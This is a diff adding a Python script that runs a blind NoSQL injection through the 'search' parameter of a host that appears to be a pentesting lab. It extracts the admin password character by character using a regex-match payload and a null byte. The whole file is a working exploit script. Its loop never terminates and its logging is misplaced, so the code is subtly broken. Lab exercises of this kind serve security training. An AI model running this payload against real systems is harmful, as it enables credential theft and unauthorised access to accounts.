@@ -1,0 +1,34 @@
+import requests
+
+url_base = "http://ptl-f9369c360ae7-e3963cd04734.libcurl.me/?search=admin'%26%26 this.password.match(/^"
+url_end = "/)%00"
+
+# Function to make a request and check if ">admin<" is in the response body
+def make_request(payload):
+    full_url = url_base + payload + url_end
+    try:
+        response = requests.get(full_url)
+        if response.status_code == 200 and ">admin<" in response.text:
+            return True
+    except requests.RequestException as e:
+        print(f"Request failed: {e}")
+    return False
+
+# Iterate through the alphabet and the '-' character
+characters = '5abcdefghijklmnopqrstuvwxyz-123467890'
+current_payload = ""
+
+while True:
+    for char in characters:
+        current_attempt = current_payload + char
+        if make_request(current_attempt):
+            print(f"Success: {current_attempt}")
+            current_payload = current_attempt
+            break
+        else:
+            print(f"Trying: {current_attempt}")
+            print(f"Success: {current_payload}")
+
+   
+
+print(f"Final result: {current_payload}")
